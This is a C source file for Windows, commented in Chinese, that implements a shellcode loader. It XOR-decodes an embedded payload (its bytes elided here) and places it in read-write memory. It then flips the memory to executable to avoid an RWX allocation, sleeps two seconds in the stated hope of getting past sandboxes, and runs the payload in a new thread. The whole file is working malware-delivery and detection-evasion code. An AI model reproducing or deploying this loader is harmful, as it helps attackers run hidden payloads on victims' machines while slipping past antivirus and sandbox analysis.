#include <Windows.h>

// 入口函数
int wmain(int argc, TCHAR* argv[]) {

    int shellcode_size = 0; // shellcode长度
    DWORD dwThreadId; // 线程ID
    HANDLE hThread; // 线程句柄
    DWORD dwOldProtect; // 内存页属性
    /* length: 800 bytes */

    unsigned char buf[] = "\xf6\x42\x89\xee\...";


    // 获取shellcode大小
    shellcode_size = sizeof(buf);

    /* 增加异或代码 */
    for (int i = 0; i < shellcode_size; i++) {
        buf[i] ^= 10;
    }
    /*
    VirtualAlloc(
        NULL, // 基址
        800,  // 大小
        MEM_COMMIT, // 内存页状态
        PAGE_EXECUTE_READWRITE // 可读可写可执行
        );
    */

    char* shellcode = (char*)VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_READWRITE // 只申请可读可写
    );

    // 将shellcode复制到可读可写的内存页中
    CopyMemory(shellcode, buf, shellcode_size);

    // 这里开始更改它的属性为可执行
    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);

    // 等待几秒，兴许可以跳过某些沙盒呢？
    Sleep(2000);

    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)shellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
    return 0;
}